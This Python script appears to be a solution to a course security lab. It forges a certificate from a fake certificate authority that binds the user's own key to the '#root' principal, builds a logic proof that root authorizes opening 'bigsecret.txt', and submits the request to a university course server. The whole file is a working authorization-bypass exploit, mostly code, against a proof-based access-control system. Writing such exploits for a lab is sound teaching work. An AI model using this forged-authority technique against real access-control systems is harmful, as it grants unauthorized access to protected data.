import sys
import json

from urllib.request import Request, urlopen
from urllib.parse import urlencode
from urllib.error import HTTPError

from crypto import Credential, Certificate, AccessRequest, fingerprint, new_user
from auth import generate_request
from logic import *
from parser import parse, sequent_parse
from prover import proof4, prove
from util import get_cas, stringify


def generate_exploit():
	print("GENERATE EXPLOIT")
	fake_ca = new_user(Agent('#fake_ca'), Agent('#fake_ca'))

	tm_normal_cert = Certificate.load_certificate(Agent('#tmuskens'))
	print(tm_normal_cert) 
	# root_private_cert = Certificate.make_for_key(fake_ca.public_key, Agent("#root"), Agent("#fake_ca"))

	# fake ca certifies that tm's key is root's key (cred1)
	root_cert = Certificate.make_for_key(tm_normal_cert.public_key, Agent("#root"), Agent("#fake_ca"))

	print(root_cert)
	

	tm_cred = Credential.from_formula(parse('open(#tmuskens, <bigsecret.txt>)'), Agent('#tmuskens'))
	normal_ca = Certificate.load_certificate(Agent("#ca"))
	
	fake_ca_key = fingerprint(fake_ca.public_key)
	
	#cred0 = tm_cred
	cred0 = 'sign(open(#tmuskens, <bigsecret.txt>), [93:32:66:16:dc:a3:50:e1:fe:8d:76:ec:dd:87:76:08]) '
	#cred1 = root_cert
	cred1 = f'sign((iskey(#root, [93:32:66:16:dc:a3:50:e1:fe:8d:76:ec:dd:87:76:08])), {fake_ca_key}) true'
	#cred2 = fake_ca_cert
	cred2 = f'iskey(#fake_ca, {fake_ca_key}) true'
	#cred3 done by verify request
	cred3 = 'ca(#fake_ca)'
	pf = proof4(parse(cred3 + ', ' + cred0 + ', ' + cred1 + ', ' + cred2 + ' |- #root says open(#tmuskens, <bigsecret.txt>)'),
				fake_ca_key)
	
	# print(pf)
	request = AccessRequest.make_for_proof(pf, Agent('#tmuskens'), [tm_cred], [root_cert, normal_ca, tm_normal_cert, fake_ca])

	
	return request

if __name__ == '__main__':

	req = generate_exploit()
	if req is None:
		sys.exit(0)

	request = Request("http://mfredrik.ini.cmu.edu:15316/accessrequest",
					  data=urlencode({
						  "request": req.serialize()
					  }).encode('utf-8'),
					  headers={'Content-Encoding': 'gzip'},
					  method='POST')
	try:
		response_object = urlopen(request, timeout=10)
		print(response_object)
	except HTTPError as e:
		response_object = e

	resp_json = json.load(response_object)
	print('\nserver response:')
	try:
		new_cred = Credential.from_json(resp_json)
		print(new_cred)
	except:
		print(resp_json)